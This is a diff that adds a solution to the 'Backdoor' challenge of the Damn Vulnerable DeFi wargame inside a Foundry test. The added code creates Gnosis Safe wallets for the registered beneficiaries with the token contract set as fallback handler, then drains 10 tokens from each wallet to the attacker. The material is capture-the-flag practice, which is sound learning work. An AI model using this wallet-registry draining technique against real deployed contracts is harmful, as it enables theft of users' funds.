@@ -8,6 +8,9 @@ import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {WalletRegistry} from "../../../src/Contracts/backdoor/WalletRegistry.sol";
 import {GnosisSafe} from "gnosis/GnosisSafe.sol";
 import {GnosisSafeProxyFactory} from "gnosis/proxies/GnosisSafeProxyFactory.sol";
+import {GnosisSafeProxy} from "gnosis/proxies/GnosisSafeProxy.sol";
+import "gnosis/proxies/IProxyCreationCallback.sol";
+import {AttackBackdoor} from "./AttackBackdoor.sol";
 
 contract Backdoor is Test {
     uint256 internal constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;
@@ -79,7 +82,24 @@ contract Backdoor is Test {
         /**
          * EXPLOIT START *
          */
+        //address[4] users = [alice, bob, charlie, david];
+        vm.startPrank(attacker);
+        for (uint8 i; i <= 3;) {
+            address[] memory beneficiary = new address[](1);
+            beneficiary[0] = users[i];
+            bytes memory init = abi.encodeWithSelector(
+                masterCopy.setup.selector, beneficiary, 1, address(0), "0x", address(dvt), 0, 0, 0
+            );
+            GnosisSafeProxy newProxy = walletFactory.createProxyWithCallback(
+                address(masterCopy), init, 1, IProxyCreationCallback(walletRegistry)
+            );
+            DamnValuableToken(address(newProxy)).transfer(attacker, 10 ether);
+            unchecked {
+                ++i;
+            }
+        }
 
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
